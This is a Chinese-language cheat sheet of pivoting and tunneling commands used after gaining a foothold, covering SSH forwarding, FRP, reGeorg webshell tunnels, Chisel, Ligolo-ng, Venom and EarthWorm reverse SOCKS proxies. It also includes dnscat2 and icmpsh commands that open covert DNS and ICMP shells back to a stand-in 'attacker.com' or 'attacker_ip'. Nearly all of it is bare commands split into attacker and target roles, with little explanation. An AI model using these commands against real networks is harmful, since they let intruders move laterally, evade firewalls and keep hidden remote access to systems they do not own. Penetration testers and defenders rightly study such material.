# 隧道代理

## 1. SSH隧道

### 本地端口转发

```bash
ssh -L 8080:127.0.0.1:80 user@target
ssh -L 3389:target:3389 jump@jump_host
```

### 远程端口转发

```bash
ssh -R 8080:127.0.0.1:80 user@target
```

### 动态端口转发(SOCKS代理)

```bash
ssh -D 1080 user@target
```

---

## 2. FRP内网穿透

### 服务端

```bash
./frps -c frps.ini
```

### 客户端

```bash
./frpc -c frpc.ini
```

---

## 3. reGeorg

```bash
python reGeorg.py -u http://target.com/tunnel.aspx
python reGeorg.py -u http://target.com/tunnel.aspx -p 8080
```

---

## 4. Chisel

### 服务端

```bash
chisel server -p 8080 --reverse
```

### 客户端

```bash
chisel client 10.0.0.1:8080 R:1080:socks
```

---

## 5. Ligolo

### 服务端

```bash
./ligolo-ng_proxy -selfcert -laddr 0.0.0.0:11601
```

### 客户端

```bash
./ligolo-ng_agent -connect 10.0.0.1:11601 -attempts 10 -delay 15 -selfcert
```

---

## 6. Venom

### 节点模式

```bash
./venom.exe -nodeport 9999
```

### 代理模式

```bash
./venom.exe -adminport 9998 -lhost 0.0.0.0
```

---

## 7. EW (EarthWorm)

### 正向代理

```bash
./ew -s ssocksd -l 1080
```

### 反向代理

```bash
# 攻击者
./ew -s rcsocks -l 1080 -e 9999

# 目标
./ew -s rssocks -d attacker_ip -e 9999
```

---

## 8. DNS隧道

### dnscat2

```bash
# 服务端
./dnscat2-server --secret=secret

# 客户端
./dnscat2 --secret=secret attacker.com
```

---

## 9. ICMP隧道

### icmpsh

```bash
# 攻击者
./icmpsh_m.py attacker_ip target_ip

# 目标
./icmpsh -t attacker_ip -s 128
```

---

## 10. SOCKS代理

### ProxyChains

```bash
proxychains nmap -sT target_ip
proxychains4 nmap -sT target_ip
```
